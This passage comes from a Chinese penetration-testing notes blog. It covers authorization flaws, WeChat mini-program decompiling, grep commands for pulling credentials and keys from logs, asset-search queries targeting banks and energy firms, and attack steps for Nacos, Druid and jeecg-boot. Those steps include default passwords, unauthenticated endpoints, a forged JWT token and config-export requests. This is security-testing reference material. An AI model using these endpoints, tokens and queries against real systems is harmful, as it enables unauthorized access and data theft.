title="越权漏洞"></a>越权漏洞</h2><ul><li><p>垂直越权</p><p>权限校验不充分，导致低权限用户可以访问高权限用户的接口，比如说随便注册一个账户就能访问各种查询接口</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">如何挖掘：</span><br><span class="line">如果有管理员账号和普通用户账号就比较简单，管理操作，然后替换数据包中的鉴权部分为普通用户的</span><br><span class="line">如果只有普通用户的账号，我觉得主要是如何获得敏感接口，一种是通过被动扫描来找到接口文档，另一种是通过从js文件中手动构造或者fuzz接口的名称</span><br></pre></td></tr></table></figure></li><li><p>水平越权</p><p>普通用户拥有其他平行级别用户的权限，比较常见的就是在获取个人信息处通过遍历id获得其他用户的个人信息</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">最常见的就是通过userid，id等参数来进行校验身份</span><br><span class="line">最好的话还是注册两个账户进行测试，这样更好发现</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">越权漏洞和遍历漏洞的区别：</span><br><span class="line">功能点的权限分配不同。越权漏洞产生的功能点是属于特定用户才能使用的，而遍历漏洞产生的功能点是应用本身就需要用到的，只是应用没有做好频率控制和数据拖取限制，导致可以通过遍历某个参数获得大量敏感信息，从而造成危害。</span><br></pre></td></tr></table></figure></li></ul><p><strong>修复方案</strong></p><ul><li>进行合理的权限划分。</li><li>权限最小化原则，限制用户不必要的权限，用户权限过期后应当予以回收。</li><li>在服务端对用户权限进行校验。</li></ul><h2 id="任意用户密码重置"><a href="#任意用户密码重置" class="headerlink" title="任意用户密码重置"></a>任意用户密码重置</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">session覆盖（session校验身份）</span><br><span class="line">密码重置链接（弱Token:时间戳，uid加密/编码   uid:任意重置其他用户）</span><br><span class="line">绑定关系失效--修改用于校验的手机号/邮箱</span><br><span class="line">验证码问题</span><br></pre></td></tr></table></figure><h2 id="业务流程绕过"><a href="#业务流程绕过" class="headerlink" title="业务流程绕过"></a>业务流程绕过</h2><ul><li><p>请求提交后由前端进行校验，此时可以拦截返回包，修改返回包中的内容，从而通过校验。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">有时候没啥用，即使能通过校验，但是不会返回token，进入到下一步后后端校验token又返回到上一个流程或者压根没有数据。</span><br></pre></td></tr></table></figure></li><li><p>先进入后台界面，再弹出校验界面，可以尝试drop掉该校验数据包</p><p><a href="https://www.t00ls.com/articles-70325.html">求助对未授权的“登录过期，请重新登录”站点利用方式 - T00ls.Com</a></p></li><li><p>多流程跳过</p><p>（1）用户输入找回密码的账号； </p><p>（2）校验凭证：向用户发送短信验证码或者找回密码链接，用户回填验证码或单击 链接进入密码重置页面，以此方式证明当前操作用户是账号主人； </p><p>（3）校验成功进入重置密码页面。</p><p>找出最后一步重置密码的接口，接着使用URL测试是否可以跳过验证身份环节。</p></li></ul><h2 id="JWT"><a href="#JWT" class="headerlink" title="JWT"></a>JWT</h2><p><a href="https://fgtbnc.github.io/2023/06/01/JWT%E4%BB%A4%E7%89%8C/">JWT安全 | Khaz (fgtbnc.github.io)</a></p><h2 id="支付安全–待测"><a href="#支付安全–待测" class="headerlink" title="支付安全–待测"></a>支付安全–待测</h2><ul><li>整型溢出</li><li>精度保留</li><li>负数</li><li>修改支付相关参数</li><li>支付接口</li></ul><h1 id="微信小程序和公众号"><a href="#微信小程序和公众号" class="headerlink" title="微信小程序和公众号"></a>微信小程序和公众号</h1><blockquote><p>这两有的会校验数据包中的User-Agent，所以用一些扫描工具的时候要带上对应的User-Agent才行</p><p><img src="/../images/image-20230828114848695.png?lastModify=1695029992" alt="image-20230828114848695"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 公众号</span><br><span class="line">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 NetType/WIFI MicroMessenger/7.0.20.1781(0x6700143B) WindowsWechat(0x63090621) XWEB/8287 Flue</span><br><span class="line"></span><br><span class="line"># 小程序</span><br><span class="line">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF XWEB/8287</span><br></pre></td></tr></table></figure></blockquote><h2 id="小程序接口→Web后台"><a href="#小程序接口→Web后台" class="headerlink" title="小程序接口→Web后台"></a>小程序接口→Web后台</h2><blockquote><p>开发者为了方便管理和调试，会在公网 Api 后端服务器上搭建一个后台管理界面从而方便管理数据</p></blockquote><p>把小程序抓包时的url复制到浏览器中，寻找后台（蛮多的🤗）</p><p>比如</p><p><img src="/../images/image-20230917224011775.png?lastModify=1695029992" alt="image-20230917224011775"></p><p>就这个后台出了三个高危，弱口令，任意文件上传，存储型xss</p><h2 id="小程序本身"><a href="#小程序本身" class="headerlink" title="小程序本身"></a>小程序本身</h2><h3 id="小程序结构"><a href="#小程序结构" class="headerlink" title="小程序结构"></a>小程序结构</h3><p><a href="https://kangzubin.com/wxapp-decompile-2/">微信小程序“反编译”实战（二）：源码还原 | 彬彬的博客 (kangzubin.com)</a></p><h3 id="抓包"><a href="#抓包" class="headerlink" title="抓包"></a>抓包</h3><p>PC：proxifier+burp</p><p>Android：同一个局域网下，wifi代理+burp</p><h3 id="反编译"><a href="#反编译" class="headerlink" title="反编译"></a>反编译</h3><p>一键解密+反编译工具</p><p><a href="https://pan.baidu.com/s/1N3ZR3djSaS8g_RXc0Hsa5Q?login_type=qzone&amp;pwd=f79y&amp;_at_=1693833286263">https://pan.baidu.com/s/1N3ZR3djSaS8g_RXc0Hsa5Q?login_type=qzone&amp;pwd=f79y&amp;_at_=1693833286263</a></p><p><strong>注意点：进入小程序后，先把各种功能点点，加载更多的程序之后再进行反编译</strong></p><p>小程序打开时</p><p><img src="/../images/image-20230904221313214.png?lastModify=1695029992" alt="image-20230904221313214"></p><p>打开点点点之后，点了一部分后就多了3MB</p><p><img src="/../images/image-20230904221135890.png?lastModify=1695029992" alt="image-20230904221135890"></p><ul><li><p>PC</p><p>需要先解密，再反编译，小程序文件位置如下</p><p><img src="/../images/image-20230730143531751.png?lastModify=1695029992" alt="image-20230730143531751"></p></li><li><p>Android</p><p>直接反编译即可</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/data/data/com.tencent.mm/MicroMsg/df69765be7b6e4a441a86a25d26e861f/appbrand/pkg/_-1486048203_3.wxapkg</span><br></pre></td></tr></table></figure></li></ul><h3 id="关注点"><a href="#关注点" class="headerlink" title="关注点"></a>关注点</h3><p><img src="/../images/%E5%B0%8F%E7%A8%8B%E5%BA%8FWEB%E6%BC%8F%E6%B4%9E_resultat.png?lastModify=1695029992" alt="image-20200508220108393"></p><h3 id="sessionkey泄漏"><a href="#sessionkey泄漏" class="headerlink" title="sessionkey泄漏"></a>sessionkey泄漏</h3><p><img src="/../images/image-20230919105141460.png" alt="image-20230919105141460"></p><p>解密</p><p><strong><img src="/../images/image-20230919102958607.png" alt="image-20230919102958607"></strong></p><h3 id="反编译调试"><a href="#反编译调试" class="headerlink" title="反编译调试"></a>反编译调试</h3><p><strong>报错修复</strong></p><p><img src="/../images/image-20230904215939364.png?lastModify=1695029992" alt="image-20230904215939364"></p><p><img src="/../images/image-20230904215953140.png?lastModify=1695029992" alt="image-20230904215953140"></p><p>wxml文件（样式文件）报错修复：直接删除</p><p>插件修复：遇到不需要使用的插件直接删除，要用到的插件去官方后台添加</p><h5 id="流量加密调试"><a href="#流量加密调试" class="headerlink" title="流量加密调试"></a>流量加密调试</h5><h5 id="签名绕过调试"><a href="#签名绕过调试" class="headerlink" title="签名绕过调试"></a>签名绕过调试</h5><h2 id="公众号"><a href="#公众号" class="headerlink" title="公众号"></a>公众号</h2><p>跟web思路一样，注意UA头即可</p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://www.hackinn.com/index.php/archives/672/">微信小程序的渗透五脉 - Hack Inn</a></p><p><a href="https://forum.butian.net/share/1227">奇安信攻防社区-浅谈微信小程序渗透</a></p><p><a href="https://developers.weixin.qq.com/community/minihome/list/1591986099080445956/2">安全中心公告 | 微信开放社区</a></p><p><a href="https://mp.weixin.qq.com/s/KfhgP97alL_d8mmOY4z44w">反编译&amp;调试小程序请求签名 (qq.com)</a></p><h1 id="小技巧"><a href="#小技巧" class="headerlink" title="小技巧"></a>小技巧</h1><h2 id="Linux命令"><a href="#Linux命令" class="headerlink" title="Linux命令"></a>Linux命令</h2><blockquote><p>Winodws下可以装个wls2</p><p>尴尬点😅</p><p>wsl2需要开启hyper-V，但是安卓模拟器又要关闭hyper-v，而且VM15.5以下的版本也需要关闭hyper-V。</p><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 关闭hyper-V后重新开启wsl</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 开启hyper-V</span></span><br><span class="line">dism.exe /Online /<span class="built_in">Enable-Feature</span> /All /FeatureName:Microsoft<span class="literal">-Hyper-V</span></span><br><span class="line"><span class="comment"># 开启wsl支持</span></span><br><span class="line"><span class="built_in">Enable-WindowsOptionalFeature</span> <span class="literal">-Online</span> <span class="literal">-FeatureName</span> Microsoft<span class="literal">-Windows-Subsystem-Linux</span></span><br></pre></td></tr></table></figure></blockquote><ul><li><p>图标哈希指纹提取</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl https://hunter.qianxin.com/favicon.ico | md5sum</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">hunter</span></span><br><span class="line">web.icon=&quot;md5&quot;</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">360</span></span><br><span class="line">favicon:&quot;MD5&quot;</span><br></pre></td></tr></table></figure></li><li><p>敏感信息查找</p><p>整合成sh脚本，一键提取</p><ul><li><p>提取Nginx日志文件中的200</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">grep -EHirn <span class="string">&quot;HTTP/1.1\&quot; 200&quot;</span> wxtest.zyxt.com.cn  | <span class="built_in">cut</span> -d <span class="string">&#x27;:&#x27;</span> -f 2- &gt; 200.txt</span><br></pre></td></tr></table></figure></li><li><p>提取url</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grep -EHirn &quot;http://|https://&quot; 200.txt  | cut -d &#x27;:&#x27; -f 2- &gt; url.txt</span><br></pre></td></tr></table></figure></li><li><p>提取账密</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">grep -EHirn <span class="string">&quot;username|password|密码|passwd|pass|testuser|user|pwd|dbuser|token|jdbc|admin|login&quot;</span> 200.txt  | <span class="built_in">cut</span> -d <span class="string">&#x27;:&#x27;</span> -f 2- &gt; pass.txt</span><br></pre></td></tr></table></figure></li><li><p>提取各种key</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">grep -EHirn <span class="string">&quot;ak|密钥|accesskey|apikey|key|secret|corpid|corpsecret|cloud|oss&quot;</span> 200.txt | <span class="built_in">cut</span> -d <span class="string">&#x27;:&#x27;</span> -f 2- &gt; key.txt</span><br></pre></td></tr></table></figure></li><li><p>提取文件下载</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">grep -EHirn <span class="string">&quot;\?file|download|attachment&quot;</span>  | <span class="built_in">cut</span> -d <span class="string">&#x27;:&#x27;</span> -f 2- &gt; FileDownload.txt</span><br></pre></td></tr></table></figure></li><li><p>提取个人敏感信息</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">grep -EHirn <span class="string">&quot;phone|mobile|card|real_name|\.png|\.jpg|\.mp4&quot;</span>  | <span class="built_in">cut</span> -d <span class="string">&#x27;:&#x27;</span> -f 2- &gt; LeakInfo.txt</span><br></pre></td></tr></table></figure></li></ul></li><li><p>文件下载</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">目录遍历漏洞，目录名默认为host</span></span><br><span class="line">wget -r --no-pare  url /mnt/c/Users/khaz/Downloads</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">批量下载,比如存储桶遍历</span></span><br><span class="line">wget -i urls.txt -P Download/</span><br></pre></td></tr></table></figure></li><li><p>文本类</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sort filename | uniq # 排序+去重</span><br><span class="line">cat file1.txt file2.txt fileN.txt &gt; out.txt # 文本合并</span><br></pre></td></tr></table></figure></li><li><p>javaweb查找数据库配置文件</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">find 路径 -type f |xargs grep &quot;com.mysql.jdbc.Driver&quot;</span><br></pre></td></tr></table></figure></li></ul><h2 id="FUZZ"><a href="#FUZZ" class="headerlink" title="FUZZ"></a>FUZZ</h2><ul><li><p>参数值</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">置空</span><br><span class="line">删除</span><br><span class="line">Null</span><br><span class="line">None</span><br><span class="line">%  模糊查询，可能直接全部查出来了</span><br></pre></td></tr></table></figure></li></ul><h2 id="请求包转换为python请求"><a href="#请求包转换为python请求" class="headerlink" title="请求包转换为python请求"></a>请求包转换为python请求</h2><p>burp：copy as curl commad</p><p><a href="https://curlconverter.com/">Convert curl commands to code</a></p><p><img src="/../images/image-20230827111636995.png" alt="image-20230827111636995"></p><h2 id="文件，目录扫描"><a href="#文件，目录扫描" class="headerlink" title="文件，目录扫描"></a>文件，目录扫描</h2><p>域名的一部分，公司名称的缩写，目录名（目录为&#x2F;cn，备份文件为&#x2F;cn&#x2F;cn.rar）</p><p><img src="/../images/image-20230929160024798.png" alt="image-20230929160024798"></p><h1 id="搜索引擎语法"><a href="#搜索引擎语法" class="headerlink" title="搜索引擎语法"></a>搜索引擎语法</h1><h2 id="Google"><a href="#Google" class="headerlink" title="Google"></a>Google</h2><p><a href="https://www.yuque.com/pmiaowu/xpl680/nmnt7i#60ed379e">Google语法之信息收集之道 (yuque.com)</a></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 逻辑运算符</span></span><br><span class="line">OR AND</span><br><span class="line"></span><br><span class="line"><span class="comment"># 公开文件</span></span><br><span class="line">site:domain ext:doc | ext:docx | ext:odt | ext:pdf | ext:rtf | ext:sxw | ext:psw | ext:ppt | ext:pptx | ext:pps | ext:csv</span><br><span class="line"></span><br><span class="line"><span class="comment"># 后台</span></span><br><span class="line">intitle:管理|后台|登陆|平台|系统 or inurl:login|admin|manage|manager|admin_login|system</span><br><span class="line"></span><br><span class="line"><span class="comment"># 必须出现xxx</span></span><br><span class="line"><span class="string">&quot;xxx&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 搜索网站正文内容</span></span><br><span class="line">intext:xxx</span><br><span class="line"></span><br><span class="line"><span class="comment"># 搜索缓存内容</span></span><br><span class="line">cache:</span><br><span class="line"></span><br><span class="line"><span class="comment"># 搜索url</span></span><br><span class="line">inurl:</span><br><span class="line"></span><br><span class="line"><span class="comment"># 过滤内容</span></span><br><span class="line">-xxx</span><br></pre></td></tr></table></figure><h2 id="空间搜索引擎"><a href="#空间搜索引擎" class="headerlink" title="空间搜索引擎"></a>空间搜索引擎</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">title=<span class="string">&quot;Directory listing for /&quot;</span></span><br><span class="line">title=<span class="string">&quot;index of/&quot;</span></span><br><span class="line">title=<span class="string">&quot;phpinfo&quot;</span></span><br><span class="line">tile=<span class="string">&quot;outlook&quot;</span> / <span class="string">&quot;tomcat&quot;</span> / <span class="string">&quot;weblogic&quot;</span>  <span class="comment"># 查找特定应用</span></span><br><span class="line">(title=<span class="string">&quot;平台&quot;</span>||title=<span class="string">&quot;管理&quot;</span>||title=<span class="string">&quot;系统&quot;</span>||title=<span class="string">&quot;后台&quot;</span>||title=<span class="string">&quot;登录&quot;</span>)</span><br><span class="line"></span><br><span class="line">server=<span class="string">&quot;WebSockify Python&quot;</span> &amp;&amp; title=<span class="string">&quot;Directory listing for /&quot;</span>  <span class="comment"># 查找novnc（novnc运行在容器里）</span></span><br><span class="line">header=xxx <span class="comment"># 请求头  感觉hunter的多</span></span><br></pre></td></tr></table></figure><p><strong>Hunter</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">(icp.name=<span class="string">&quot;银行&quot;</span>||icp.name=<span class="string">&quot;信用合作联社&quot;</span>||icp.name=<span class="string">&quot;信用社联合社&quot;</span>)</span><br><span class="line"></span><br><span class="line">(icp.name=<span class="string">&quot;信托有限&quot;</span>||icp.name=<span class="string">&quot;财务有限&quot;</span>||icp.name=<span class="string">&quot;理财有限&quot;</span>)</span><br><span class="line"></span><br><span class="line">(icp.name=<span class="string">&quot;天然气集团&quot;</span>||icp.name=<span class="string">&quot;核工业集团&quot;</span>||icp.name=<span class="string">&quot;国家电网&quot;</span>||icp.name=<span class="string">&quot;石油化工&quot;</span>||icp.name=<span class="string">&quot;能源集团&quot;</span>)</span><br><span class="line"></span><br><span class="line">app.name==<span class="string">&quot;Vue.js&quot;</span>&amp;&amp;(icp.name=<span class="string">&quot;银行&quot;</span>)&amp;&amp;(title=<span class="string">&quot;平台&quot;</span>||title=<span class="string">&quot;管理&quot;</span>||title=<span class="string">&quot;系统&quot;</span>||title=<span class="string">&quot;后台&quot;</span>||title=<span class="string">&quot;登录&quot;</span>)</span><br><span class="line"></span><br><span class="line">icp.industry=<span class="string">&quot;货币金融服务&quot;</span></span><br><span class="line"></span><br><span class="line">ip.province=<span class="string">&quot;江苏&quot;</span>搜索IP对应主机在江苏省的资产</span><br><span class="line">ip.country=<span class="string">&quot;CN&quot;</span>      中国资产（空间搜索引擎搜到的国外的都是bc，狠狠地污染）</span><br></pre></td></tr></table></figure><p><strong>Fofa</strong></p><p><a href="https://fofa.info/library">https://fofa.info/library</a></p><p><a href="https://github.com/ibaiw/fofa">Fofa网络测绘命令汇总</a></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cert=英文缩写   <span class="comment"># 证书内容</span></span><br><span class="line">cert.subject=英文缩写 <span class="comment"># 证书持有者</span></span><br><span class="line">cert.issuer=英文缩写 <span class="comment"># 证书颁发者</span></span><br><span class="line"></span><br><span class="line">org=<span class="string">&quot;China Education and Research Network Center&quot;</span> <span class="comment">#教育网段</span></span><br></pre></td></tr></table></figure><p><strong>零零信安</strong></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>渗透中常见应用记录</title>
      <link href="/2023/08/03/%E5%B8%B8%E8%A7%81%E5%BA%94%E7%94%A8%E8%AE%B0%E5%BD%95/"/>
      <url>/2023/08/03/%E5%B8%B8%E8%A7%81%E5%BA%94%E7%94%A8%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h1 id="碰到的应用不完全记录"><a href="#碰到的应用不完全记录" class="headerlink" title="碰到的应用不完全记录"></a>碰到的应用不完全记录</h1><table><thead><tr><th align="center">CMS</th><th align="center">阿里系</th><th align="center">JAVA</th><th align="center">国内软件</th><th align="center">数据库</th><th align="center">API</th><th align="center">云相关</th></tr></thead><tbody><tr><td align="center">Laravel</td><td align="center">druid monitor</td><td align="center">fastjson</td><td align="center">畅捷</td><td align="center">常见数据库</td><td align="center">Wsdl接口</td><td align="center">OSS</td></tr><tr><td align="center">ThinkPHP</td><td align="center">Nacos</td><td align="center">log4j</td><td align="center">海康威视</td><td align="center">Redis</td><td align="center">Swagger接口</td><td align="center">docker逃逸</td></tr><tr><td align="center">Drupal</td><td align="center">hessian组件</td><td align="center">Thymeleaf</td><td align="center">各种OA</td><td align="center">ES</td><td align="center">Webpack</td><td align="center">Minio</td></tr><tr><td align="center">DeadCMS</td><td align="center"></td><td align="center">Weblogic</td><td align="center">H3C</td><td align="center">MQTT（物联网协议）</td><td align="center">GraphQL</td><td align="center">Harbor</td></tr><tr><td align="center">Wordpress</td><td align="center"></td><td align="center">shiro</td><td align="center">金蝶云星空</td><td align="center"></td><td align="center"></td><td align="center">Rancher</td></tr><tr><td align="center">Joomla</td><td align="center"></td><td align="center">spring</td><td align="center">jeecg-boot</td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center"></td><td align="center"></td><td align="center">JBOSS</td><td align="center">若依</td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center"></td><td align="center"></td><td align="center"></td><td align="center">帆软</td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center"></td><td align="center"></td><td align="center"></td><td align="center">phpstudy</td><td align="center"></td><td align="center"></td><td align="center"></td></tr></tbody></table><h3 id="Nacos"><a href="#Nacos" class="headerlink" title="Nacos"></a>Nacos</h3><blockquote><p>一个易于使用的动态服务发现、配置和服务管理平台，用于构建云原生应用程序。</p></blockquote><p>通常在8848端口+&#x2F;nacos</p><p><img src="/../images/image-20231014100945576.png" alt="image-20231014100945576"></p><p><a href="https://xz.aliyun.com/t/11493#toc-0">Nacos结合Spring Cloud Gateway RCE利用 - 先知社区 (aliyun.com)</a></p><p><a href="https://github.com/c0olw/NacosRce">c0olw&#x2F;NacosRce: Nacos JRaft Hessian 反序列化 RCE 加载字节码 注入内存马 不出网利用 (github.com)</a></p><p><a href="https://github.com/pap1rman/postnacos">pap1rman&#x2F;postnacos: 哥斯拉nacos后渗透插件 maketoken adduser (github.com)</a></p><p><a href="https://github.com/charonlight/NacosExploitGUI">charonlight&#x2F;NacosExploitGUI: Nacos综合漏洞利用GUI工具，集成了默认口令漏洞、SQL注入漏洞、身份认证绕过漏洞、反序列化漏洞的检测及其利用 (github.com)</a></p><p><a href="https://mp.weixin.qq.com/s/Jwwd5ailKNhwR57ACXB1kQ">云原⽣组件Nacos新型红队手法研究 (qq.com)</a></p><p><a href="https://mp.weixin.qq.com/s/8SKvHX6wEOohzwSIivOyMw">记一次对微服务架构的渗透测试 (qq.com)</a></p><p><a href="https://buaq.net/go-166645.html">【漏洞复现】Nacos存在SQL注入漏洞 (buaq.net)</a></p><p><a href="https://github.com/alibaba/nacos/issues/10613">Nacos 存在 SQL 注入漏洞 · Issue #10613 · alibaba&#x2F;nacos (github.com)</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">默认口令（CNVD-2021-24491）</span><br><span class="line">nacos/nacos</span><br><span class="line"></span><br><span class="line">未授权访问</span><br><span class="line">-任意用户查看 /nacos/v1/auth/users?pageNo=1&amp;pageSize=2</span><br><span class="line">-任意用户注册 /nacos/v1/auth/users  POST：username=crow&amp;password=crow</span><br><span class="line">/nacos/v1/auth/users?username=crow&amp;password=crow</span><br><span class="line">-User-Agent: Nacos-Server（低版本直接访问url，1.2~1.4可以尝试添加UA头来绕过鉴权）</span><br><span class="line"></span><br><span class="line">Nacos 默认 secret.key 配置不当权限绕过漏洞（CNVD-2023674205）</span><br><span class="line">-Nacos &lt;= 2.2.0</span><br><span class="line">-https://www.anquanke.com/post/id/288930</span><br><span class="line">-利用默认secret.key生成JWT Token，从而造成权限绕过访问到相关API接口</span><br><span class="line">-/nacos/v1/auth/users?pageNo=1&amp;pageSize=2&amp;accessToken=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTc5OTMxODM3OH0.jR1idVKGeickN20hffQzb80Yp2qQx5m8ApKf5BeR05g  （我生成的2027年过期的）</span><br><span class="line">-或者/nacos/v1/auth/users?pageNo=1&amp;pageSize=2 添加accessToken:JWT （失败）</span><br><span class="line"></span><br><span class="line">nacos外置derby数据库没有鉴权导致的任意select查询操作，select * from users</span><br><span class="line"></span><br><span class="line">密码解密相关，nacos使用的加密方式为Bcrypt加密，破解小工具https://link.zhihu.com/?target=https%3A//gitee.com/mzq-123/picture/raw/master/Bcrypt/BCrypt-de.jar</span><br><span class="line"></span><br><span class="line">进入后台后</span><br><span class="line">-节点列表和配置情况，找一下有没有key</span><br><span class="line">-可能存在反序列化漏洞</span><br></pre></td></tr></table></figure><p>遇到的问题</p><p><img src="/../images/image-20230922162225777.png" alt="image-20230922162225777"></p><p>加入该参数即可</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/nacos/v1/auth/users?pageNo=1&amp;pageSize=9&amp;search=blur</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230922162322359.png" alt="image-20230922162322359"></p><p>但是无法任意注册用户</p><p>正常注册用户就是为了进后台翻配置，直接未授权访问后台接口</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/nacos/v1/cs/configs?search=accurate&amp;dataId=&amp;group=&amp;pageNo=1&amp;pageSize=99</span><br><span class="line">或者</span><br><span class="line">/nacos/v1/cs/configs?search=blur&amp;dataId=&amp;group=&amp;pageNo=1&amp;pageSize=99</span><br><span class="line">或者</span><br><span class="line">/nacos/v1/cs/configs?search=accurate&amp;dataId=&amp;group=&amp;pageNo=1&amp;pageSize=99&amp;tenant=</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230922162939322.png" alt="image-20230922162939322"></p><p>但是这只能获取默认命名空间<code>public</code>里面的数据中的配置</p><p><strong>获取其他Namespace的配置数据</strong></p><p>将就用pubilc做演示</p><ul><li><p>获取namespace信息</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/nacos/v1/console/namespaces</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230922164653541.png" alt="image-20230922164653541"></p></li><li><p>查询指定namespace的配置数据</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># tenant=namespace</span></span><br><span class="line">/nacos/v1/cs/configs?search=accurate&amp;dataId=&amp;group=&amp;pageNo=1&amp;pageSize=99&amp;tenant=</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230922165118423.png" alt="image-20230922165118423"></p></li></ul><p><strong>配置文件导出</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nacos/v1/cs/configs?<span class="built_in">export</span>=<span class="literal">true</span>&amp;tenant=&amp;group=&amp;appName=&amp;ids=</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230922165211522.png" alt="image-20230922165211522"></p><h3 id="alibaba-druid-monitor"><a href="#alibaba-druid-monitor" class="headerlink" title="alibaba druid monitor"></a>alibaba druid monitor</h3><blockquote><h5 id="Druid是阿里巴巴数据库事业部出品，为监控而生的数据库连接池"><a href="#Druid是阿里巴巴数据库事业部出品，为监控而生的数据库连接池" class="headerlink" title="Druid是阿里巴巴数据库事业部出品，为监控而生的数据库连接池"></a><strong>Druid是阿里巴巴数据库事业部出品，为监控而生的数据库连接池</strong></h5><h5 id="监控SQL的执行时间、监控Web-URI的请求、Session监控"><a href="#监控SQL的执行时间、监控Web-URI的请求、Session监控" class="headerlink" title="监控SQL的执行时间、监控Web URI的请求、Session监控."></a>监控SQL的执行时间、监控Web URI的请求、Session监控.</h5><p><img src="/../images/image-20230714210240219.png" alt="image-20230714210240219"></p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">未授权访问路径： </span><br><span class="line">/druid/index.html</span><br><span class="line">/druid/websession.html</span><br><span class="line">/druid/weburi.html</span><br><span class="line">    </span><br><span class="line">/druid/basic.json </span><br><span class="line">/druid/websession.json</span><br><span class="line">/druid/weburi.json</span><br><span class="line">    </span><br><span class="line">需要登陆的话，登录入口路径：</span><br><span class="line">/druid/login.html</span><br><span class="line"></span><br><span class="line">利用姿势：</span><br><span class="line">Session监控获取用户身份（session可能是过期的无用，需要爆破验证;网站不使用session来进行鉴权，所以无用）</span><br><span class="line">URI获取后台路径：测试未授权访问，或者配合session进行后台操作</span><br></pre></td></tr></table></figure><h3 id="jeecg-boot"><a href="#jeecg-boot" class="headerlink" title="jeecg-boot"></a>jeecg-boot</h3><p><img src="/../images/image-20230921214423085.png" alt="image-20230921214423085"></p><ul><li><p>组件</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/jeecg-boot/druid/index.html <span class="comment"># admin/123456</span></span><br><span class="line">/jeecg-boot/actuator  <span class="comment"># 一般存在httptrace端点</span></span><br><span class="line">/jeecg-boot/doc.html，/jeecg-boot/swagger-ui.html <span class="comment">#Basic认证 jeecg/jeecg1314</span></span><br><span class="line">/jeecg-boot/v2/api-docs</span><br><span class="line"></span><br><span class="line">rabitmq http://localhost:15672guest/guest</span><br><span class="line">nacos（服务注册发现和统一配置中心）http://localhost:8848/nacosnacos/nacos</span><br><span class="line">xxl-job-admin（分布式定时任务）http://localhost:9080/xxl-job-adminadmin/123456</span><br><span class="line">redis （缓存）127.0.0.1:6379密码空</span><br></pre></td></tr></table></figure></li><li><p>操作</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /jeecg-boot/sys/user/exportXls # 导出用户</span><br><span class="line">GET /jeecg-boot/sys/user/list # 查询用户列表</span><br><span class="line">GET /jeecg-boot/sxams/mysqlbackup/list # 查看数据库备份</span><br><span class="line">GET /jeecg-boot/sys/sysAnnouncementSend/getMyAnnouncementSend # 消息通知</span><br><span class="line">GET /jeecg-boot/sys/dataSource/list #获取数据库相关信息</span><br><span class="line"></span><br><span class="line"># 修改密码</span><br><span class="line">PUT /jeecg-boot/sys/user/changePassword</span><br><span class="line">Content-Type: application/json</span><br><span class="line">&#123;&quot;username&quot;:&quot;1231222&quot;,&quot;password&quot;:&quot;Qwer1234!&quot;,&quot;confirmpassword&quot;:&quot;Qwer1234!&quot;&#125;</span><br></pre></td></tr></table></figure></li><li><p>未授权查询（可以查询到用户名和电话号码）</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span 